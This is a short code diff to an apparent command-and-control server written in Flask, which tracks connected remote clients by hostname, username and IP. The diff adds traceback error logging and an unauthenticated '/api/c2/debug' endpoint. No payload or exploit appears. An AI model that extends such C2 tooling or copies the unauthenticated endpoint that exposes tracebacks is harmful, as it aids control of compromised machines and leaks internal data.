@@ -32,6 +32,7 @@ tasklist_results_lock = threading.Lock()
 # WebSocket connected clients: client_id -> {ws, hostname, username, ip, user_id}
 ws_clients = {}
 ws_clients_lock = threading.Lock()
+ws_error_log = []
 
 # Paths setup
 BASE_DIR = os.path.abspath(os.path.dirname(__file__))
@@ -897,12 +898,22 @@ def c2_websocket(ws):
             with get_db() as db:
                 db.execute('UPDATE clients SET last_heartbeat = CURRENT_TIMESTAMP WHERE client_id = ?', (client_id,))
                 db.commit()
-    except Exception:
-        pass
+    except Exception as e:
+        import traceback
+        ws_error_log.append({'client_id': client_id, 'error': str(e), 'tb': traceback.format_exc(), 'ts': time.time()})
+        if len(ws_error_log) > 50:
+            ws_error_log.pop(0)
     finally:
         if client_id:
             with ws_clients_lock:
                 ws_clients.pop(client_id, None)
+
+
+@app.route('/api/c2/debug')
+def c2_debug():
+    with ws_clients_lock:
+        online = list(ws_clients.keys())
+    return jsonify({'online': online, 'errors': ws_error_log[-10:]})
 
 
 @app.route('/api/c2/clients', methods=['GET'])
